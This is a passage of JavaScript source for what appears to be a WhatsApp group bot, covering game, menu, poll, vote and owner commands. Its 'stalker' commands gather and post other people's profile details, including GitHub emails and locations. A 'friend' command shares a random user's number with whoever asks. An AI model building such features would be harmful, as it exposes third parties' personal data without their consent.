        },
      },
    };

    switch (command) {
      case "ttc":
      case "ttt":
      case "tictactoe":
        {
          let TicTacToe = require("./lib/tictactoe");
          this.game = this.game ? this.game : {};
          if (
            Object.values(this.game).find(
              (room13) =>
                room13.id.startsWith("tictactoe") &&
                [room13.game.playerX, room13.game.playerO].includes(m.sender)
            )
          )
            return replygcnhd(`You Are Still In The Game`);
          let room13 = Object.values(this.game).find(
            (room13) =>
              room13.state === "WAITING" && (text ? room13.name === text : true)
          );
          if (room13) {
            room13.o = m.chat;
            room13.game.playerO = m.sender;
            room13.state = "PLAYING";
            let arr = room13.game.render().map((v) => {
              return {
                X: "❌",
                O: "⭕",
                1: "1️⃣",
                2: "2️⃣",
                3: "3️⃣",
                4: "4️⃣",
                5: "5️⃣",
                6: "6️⃣",
                7: "7️⃣",
                8: "8️⃣",
                9: "9️⃣",
              }[v];
            });
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}

Waiting @${room13.game.currentTurn.split("@")[0]}

Type *surrender* to surrender and admit defeat`;
            if (room13.x !== room13.o)
              await NhdBotFunc.sendText(room13.x, str, m, {
                mentions: parseMention(str),
              });
            await NhdBotFunc.sendText(room13.o, str, m, {
              mentions: parseMention(str),
            });
          } else {
            room13 = {
              id: "tictactoe-" + +new Date(),
              x: m.chat,
              o: "",
              game: new TicTacToe(m.sender, "o"),
              state: "WAITING",
            };
            if (text) room13.name = text;
            replygcnhd(
              "Waiting For Partner" +
                (text
                  ? ` Type The Command Below ${prefix}${command} ${text}`
                  : "")
            );
            this.game[room13.id] = room13;
          }
        }
        break;
      case "delttc":
      case "delttt":
        {
          this.game = this.game ? this.game : {};
          try {
            if (this.game) {
              delete this.game;
              NhdBotFunc.sendText(
                m.chat,
                `Successfully deleted TicTacToe session`,
                m
              );
            } else if (!this.game) {
              replygcnhd(`Session TicTacToe🎮 does not exist`);
            } else throw "?";
          } catch (e) {
            replygcnhd("damaged");
          }
        }
        break;
      case "suitpvp":
      case "rps":
      case "rockpaperscissors":
      case "suit":
        {
          this.suit = this.suit ? this.suit : {};
          let poin = 10;
          let poin_lose = 10;
          let timeout = 60000;
          if (
            Object.values(this.suit).find(
              (roof) =>
                roof.id.startsWith("suit") &&
                [roof.p, roof.p2].includes(m.sender)
            )
          )
            replygcnhd(`Complete your previous game`);
          if (m.mentionedJid[0] === m.sender)
            return replygcnhd(`Can't play with myself !`);
          if (!m.mentionedJid[0])
            return replygcnhd(
              `_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner}`,
              m.chat,
              { mentions: [owner[1] + "@s.whatsapp.net"] }
            );
          if (
            Object.values(this.suit).find(
              (roof) =>
                roof.id.startsWith("suit") &&
                [roof.p, roof.p2].includes(m.mentionedJid[0])
            )
          )
            return replygcnhd(
              `The person you are challenging is playing suit with someone else :(`
            );
          let id = "suit_" + new Date() * 1;
          let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Challenged* @${
            m.mentionedJid[0].split`@`[0]
          } *to play suit*

*Hi* @${
            m.mentionedJid[0].split`@`[0]
          } *Please type accept to accept or type reject to reject`;
          this.suit[id] = {
            chat: await NhdBotFunc.sendText(m.chat, caption, m, {
              mentions: parseMention(caption),
            }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: "wait",
            waktu: setTimeout(() => {
              if (this.suit[id])
                NhdBotFunc.sendText(m.chat, `_Suit time out_`, m);
              delete this.suit[id];
            }, 60000),
            poin,
            poin_lose,
            timeout,
          };
        }
        break;
      case "public":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          NhdBotFunc.public = true;
          replygcnhd("*Successful in Changing To Public Usage*");
        }
        break;
      case "self":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          NhdBotFunc.public = false;
          replygcnhd("*Successful in Changing To Self Usage*");
        }
        break;
      case "rentbot":
        {
          if (m.isGroup) return NhdStickPrivate();
          if (!NhdTheCreator) return NhdStickOwner();
          rentfromnhd(NhdBotFunc, m, from);
        }
        break;
      case "rentbotlist":
        try {
          let user = [
            ...new Set([
              ...global.conns
                .filter((NhdBotFunc) => NhdBotFunc.user)
                .map((NhdBotFunc) => NhdBotFunc.user),
            ]),
          ];
          te = "*Rentbot List*\n\n";
          for (let i of user) {
            y = await NhdBotFunc.decodeJid(i.id);
            te += " × User : @" + y.split("@")[0] + "\n";
            te += " × Name : " + i.name + "\n\n";
          }
          NhdBotFunc.sendMessage(
            from,
            { text: te, mentions: [y] },
            { quoted: m }
          );
        } catch (err) {
          replygcnhd(`There are no users who have rented the bot yet`);
        }
        break;
      case "shutdown":
        if (!NhdTheCreator) return NhdStickOwner();
        replygcnhd(`Ba bye...`);
        await sleep(3000);
        process.exit();
        break;
      case "owner":
        {
          const repf = await NhdBotFunc.sendMessage(
            from,
            {
              contacts: {
                displayName: `${list.length} Contact`,
                contacts: list,
              },
              mentions: [sender],
            },
            { quoted: m }
          );
          NhdBotFunc.sendMessage(
            from,
            {
              text: `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`,
              mentions: [sender],
            },
            { quoted: repf }
          );
        }
        break;
      case "alive":
      case "panel":
      case "list":
      case "menu":
      case "help":
      case "?":
        {
          let ownernya = ownernomer + "@s.whatsapp.net";
          let me = m.sender;
          let timestampe = speed();
          let latensie = speed() - timestampe;
          nhdezy = `┌─❖
│ Hi 👋 
└┬❖  ${pushname} 
┌┤✑  ${nhdytimewisher} 😄
│└────────────┈ ⳹
│
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊        
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${global.botname}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: ${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  NO-PREFIX 
│𝗠𝗼𝗱𝗲 : ${NhdBotFunc.public ? "Public" : `Self`}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝗡𝗮𝗺𝗲 : ${pushname}
│𝗡𝘂𝗺𝗯𝗲𝗿 : @${me.split("@")[0]}
│𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${isPrem ? "✅" : `❌`}
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝗧𝗶𝗺𝗲 : ${xtime}
│𝗗𝗮𝘁𝗲 : ${xdate}
└┬────────────┈ ⳹
   │✑  Please Type The *MENU*
   │✑  Given *BELOW*
┌└─────────────┈ ⳹
│❏.allmenu
│❏.downloadmenu
│❏.funmenu
│❏.aimenu
│❏.groupmenu
│❏.ownermenu
│❏.photooxymenu
│❏.ephoto360menu
│❏.animemenu
│❏.nsfwmenu
│❏.randomphotomenu
│❏.randomvideomenu
│❏.stickermenu
│❏.databasemenu
│❏.stalkermenu
│❏.bugmenu
│❏.othermenu
└─────────────────┈ ⳹`;
          let ments = [ownernya, me, mark];
          NhdBotFunc.sendMessage(
            from,
            {
              text: nhdezy,
              contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                mentionedJid: [sender],
                externalAdReply: {
                  showAdAttribution: true,
                  renderLargerThumbnail: true,
                  title: botname,
                  containsAutoReply: true,
                  mediaType: 1,
                  thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                  mediaUrl: `${wagc}`,
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "allmenu":
        {
          var unicorn = await getBuffer(picak + "All Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${allmenu(prefix, hituet)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "ownermenu":
        {
          var unicorn = await getBuffer(picak + "Owner Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "othermenu":
        {
          var unicorn = await getBuffer(picak + "Other Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "downloadmenu":
        {
          var unicorn = await getBuffer(picak + "Download Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "groupmenu":
        {
          var unicorn = await getBuffer(picak + "Group Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "funmenu":
        {
          var unicorn = await getBuffer(picak + "Fun Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "stalkermenu":
        {
          var unicorn = await getBuffer(picak + "Stalker Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "randomphotomenu":
        {
          var unicorn = await getBuffer(picak + "Random Pic Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${randphotomenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "randomvideomenu":
        {
          var unicorn = await getBuffer(picak + "Random Vid Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${randvideomenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "photooxymenu":
        {
          var unicorn = await getBuffer(picak + "Photooxy Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "ephoto360menu":
        {
          var unicorn = await getBuffer(picak + "Photo360 Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "nsfwmenu":
        {
          var unicorn = await getBuffer(picak + "Anime NSFW Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${nsfwmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "animemenu":
        {
          var unicorn = await getBuffer(picak + "Anime Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${animemenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "stickermenu":
        {
          var unicorn = await getBuffer(picak + "Sticker Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${stickermenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "databasemenu":
        {
          var unicorn = await getBuffer(picak + "Database Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${databasemenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "aimenu":
        {
          var unicorn = await getBuffer(picak + "OpenAI Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${aimenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "bugmenu":
        {
          var unicorn = await getBuffer(picak + "Bug Menu");
          sendNhdBotFuncMessage(from, {
            text: `Hi @${sender.split("@")[0]}\n\n${bugmenu(prefix)}`,
            mentions: [sender],
            contextInfo: {
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case "sound41":
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case "sound76":
      case "sound77":
      case "sound78":
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case "sound89":
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case "sound95":
      case "sound96":
      case "sound97":
      case "sound98":
      case "sound99":
      case "sound100":
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case "sound110":
      case "sound111":
      case "sound112":
      case "sound113":
      case "sound114":
      case "sound115":
      case "sound116":
      case "sound117":
      case "sound118":
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case "sound128":
      case "sound129":
      case "sound130":
      case "sound131":
      case "sound132":
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case "sound138":
      case "sound139":
      case "sound140":
      case "sound141":
      case "sound142":
      case "sound143":
      case "sound144":
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case "sound152":
      case "sound153":
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        NhdBotFunc_dev = await getBuffer(
          `https://github.com/DGNhd/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
        );
        await NhdBotFunc.sendMessage(
          m.chat,
          { audio: NhdBotFunc_dev, mimetype: "audio/mp4", ptt: true },
          { quoted: m }
        );
        break;
      case "friend":
      case "searchfriend":
        {
          await NhdStickWait();
          let teman = pickRandom(nhdverifieduser);
          setTimeout(() => {}, 1000);
          setTimeout(() => {
            replygcnhd("Managed to Get One Person");
          }, 5000);
          setTimeout(() => {
            NhdBotFunc.sendMessage(
              from,
              { text: `Here @${teman.split("@")[0]}`, mentions: [teman] },
              { quoted: m }
            );
          }, 9000);
        }
        break;
      case "sc":
      case "script":
      case "donate":
      case "donate":
      case "cekupdate":
      case "updatebot":
      case "cekbot":
      case "sourcecode":
        {
          me = m.sender;
          teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${
            global.websitex
          }\nGitHub: ${global.botscript}\n\nHi @${
            me.split("@")[0]
          } 👋\nDont forget to donate yeah🍜 👇 https://i.ibb.co/y6XmZ2b/donate.png`;
          sendNhdBotFuncMessage(from, {
            text: teks,
            mentions: [sender],
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [sender],
              externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: true,
                title: botname,
                containsAutoReply: true,
                mediaType: 1,
                thumbnail: fs.readFileSync("./NhdMedia/theme/cheemspic.jpg"),
                mediaUrl: `${wagc}`,
                sourceUrl: `${wagc}`,
              },
            },
          });
        }
        break;
      case "repo":
      case "repository":
        {
          const githubRepoURL = "https://github.com/DGNhd/CheemsBot-MD8";
          try {
            const [, username, repoName] = githubRepoURL.match(
              /github\.com\/([^/]+)\/([^/]+)/
            );
            const response = await axios.get(
              `https://api.github.com/repos/${username}/${repoName}`
            );
            if (response.status === 200) {
              const repoData = response.data;
              const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim();
              await NhdBotFunc.relayMessage(
                m.chat,
                {
                  requestPaymentMessage: {
                    currencyCodeIso4217: "INR",
                    amount1000: 69000,
                    requestFrom: m.sender,
                    noteMessage: {
                      extendedTextMessage: {
                        text: formattedInfo,
                        contextInfo: {
                          externalAdReply: {
                            showAdAttribution: true,
                          },
                        },
                      },
                    },
                  },
                },
                {}
              );
            } else {
              await replygcnhd(`Unable to fetch repository information`);
            }
          } catch (error) {
            console.error(error);
            await replygcnhd(
              `An error occurred while fetching repository information`
            );
          }
        }
        break;
      case "request":
      case "reportbug":
        {
          if (!text)
            return replygcnhd(
              `Example : ${prefix + command} hi dev play command is not working`
            );
          textt = `*| REQUEST/BUG |*`;
          teks1 = `\n\n*User* : @${
            m.sender.split("@")[0]
          }\n*Request/Bug* : ${text}`;
          teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`;
          for (let i of owner) {
            NhdBotFunc.sendMessage(
              i + "@s.whatsapp.net",
              {
                text: textt + teks1,
                mentions: [m.sender],
              },
              {
                quoted: m,
              }
            );
          }
          NhdBotFunc.sendMessage(
            m.chat,
            {
              text: textt + teks2 + teks1,
              mentions: [m.sender],
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "q":
      case "quoted":
        {
          if (!m.quoted) return replygcnhd("Reply the Message!!");
          let nhdquotx = await NhdBotFunc.serializeM(await m.getQuotedObj());
          if (!nhdquotx.quoted)
            return replygcnhd(
              "The message you are replying to is not sent by the bot"
            );
          await nhdquotx.quoted.copyNForward(m.chat, true);
        }
        break;
      case "igstalk2":
        {
          if (!q) return replygcnhd(`Example ${prefix + command} unicorn_nhd`);
          await NhdStickWait();
          const aj = await igstalk(`${q}`);
          NhdBotFunc.sendMessage(
            m.chat,
            {
              image: { url: aj.profile },
              caption: `*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}`,
            },
            { quoted: m }
          );
        }
        break;
      case "ffstalk":
        {
          if (!q) return replygcnhd(`Example ${prefix + command} 946716486`);
          await NhdStickWait();
          eeh = await ffstalk.ffstalk(`${q}`);
          replygcnhd(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`);
        }
        break;
      case "mlstalk":
        {
          if (!q)
            return replygcnhd(`Example ${prefix + command} 530793138|8129`);
          await NhdStickWait();
          let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1]);
          replygcnhd(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`);
        }
        break;
      case "npmstalk":
        {
          if (!q) return replygcnhd(`Example ${prefix + command} nhdapi`);
          await NhdStickWait();
          eha = await npmstalk.npmstalk(q);
          replygcnhd(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`);
        }
        break;
      case "ghstalk":
      case "githubstalk":
        {
          if (!q) return replygcnhd(`Example ${prefix + command} DGNhd`);
          await NhdStickWait();
          aj = await githubstalk.githubstalk(`${q}`);
          NhdBotFunc.sendMessage(
            m.chat,
            {
              image: { url: aj.profile_pic },
              caption: `*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}`,
            },
            { quoted: m }
          );
        }
        break;
      case "ss":
      case "ssweb":
        {
          if (!q) return replygcnhd(`Example ${prefix + command} link`);
          await NhdStickWait();
          let krt = await scp1.ssweb(q);
          NhdBotFunc.sendMessage(
            from,
            { image: krt.result, caption: mess.succes },
            { quoted: m }
          );
        }
        break;
      case "join":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (!text) return replygcnhd(`Contoh ${prefix + command} linkgc`);
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return replygcnhd("Link Invalid!");
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          await NhdBotFunc.groupAcceptInvite(result);
          await replygcnhd(`Done`);
        }
        break;
      case "poll":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          let [poll, opt] = text.split("|");
          if (text.split("|") < 2)
            return await replygcnhd(
              `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Nhd,Cheems,Doge...`
            );
          let options = [];
          for (let i of opt.split(",")) {
            options.push(i);
          }
          await NhdBotFunc.sendMessage(m.chat, {
            poll: {
              name: poll,
              values: options,
            },
          });
        }
        break;
      case "vote":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (m.chat in vote)
            return replygcnhd(
              `_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`
            );
          if (!text)
            return replygcnhd(
              `Enter Reason for Vote, Example: *${
                prefix + command
              } Handsome Owner*`
            );
          replygcnhd(
            `Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`
          );
          vote[m.chat] = [q, [], []];
          await sleep(1000);
          upvote = vote[m.chat][1];
          devote = vote[m.chat][2];
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          NhdBotFunc.sendMessage(m.chat, { text: teks_vote }, { quoted: m });
        }
        break;
      case "upvote":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!(m.chat in vote))
            return replygcnhd(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          isVote = vote[m.chat][1].concat(vote[m.chat][2]);
          wasVote = isVote.includes(m.sender);
          if (wasVote) return replygcnhd("You have Voted");
          vote[m.chat][1].push(m.sender);
          menvote = vote[m.chat][1].concat(vote[m.chat][2]);
          teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`;
          NhdBotFunc.sendMessage(
            m.chat,
            { text: teks_vote, mentions: menvote },
            { quoted: m }
          );
        }
        break;
      case "downvote":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!(m.chat in vote))
            return replygcnhd(
              `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            );
          isVote = vote[m.chat][1].concat(vote[m.chat][2]);
